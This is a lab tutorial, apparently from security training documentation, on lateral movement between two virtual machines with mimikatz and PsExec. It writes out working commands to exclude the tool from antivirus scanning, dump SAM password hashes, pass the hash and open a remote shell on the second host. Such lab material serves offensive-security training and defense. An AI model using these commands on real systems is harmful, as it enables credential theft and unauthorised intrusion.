:orphan:
(mimikatz)=

# Using mimikatz for lateral movement

## Required: 

1. Two virtual machines on the same subnet, Machine-A and Machine-B.
2. Admin privileges on Machine-A is required.
3. The same credentials (username and password combination) are used for the local administrator account on both machines.

## Preliminary Steps

1. In the following registry path `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ` create a DWORD titled `LocalAccountTokenFilterPolicy` and set the value to 1.
<br>

1. Allow SMB traffic. This can be done by allowing traffic using the Firewall rules *File and Printer Sharing (SMB-In)*

## Steps

1. Login as the local administrator on Machine-A.
<br>

2. Download mimikatz from the Github repository and save it to a folder excluded from AV scanning.
<br>

3. On Machine-A, execute mimikatz with admin privileges (right click -> run as admin) and use the following command to obtain debug privileges: `privilege::debug`
<br>

4. Elevate privileges to SYSTEM using the following command: `token::elevate`. You can view the current privileges using the following command: `token::whoami`
<br>

5. Dump user password hashes from the SAM file using the following command: `lsadump::sam`. Then note the hash of the local administrator's password.
<br>

6. Then pass the hash to perform lateral movement using the following command: `sekurlsa::pth /user:local_admin_name /domain:MachineA_name /ntlm:hash`, where: *local_admin_name* is the name of the local administrator account, *MachineA_name* is the name of Machine-A and *hash* refers to the local administrator's password hash obtained in the previous step. A command prompt with administrator privileges will be spawned. Example: `sekurlsa::pth /user:ladmin /domain:DESKTOP-TCHDJG /ntlm:74657384957362628596836257586`
<br>

7. A command prompt with administrator privileges will be spawned. In this window, use PsExec to login remotely to Machine-B using just its IP address. Assume the IP address of Machine-B is 192.168.52.67, the command to login remotely is `psexec \\192.168.52.67 cmd`. You will now be able to issue commands on Machine-B.
<br>
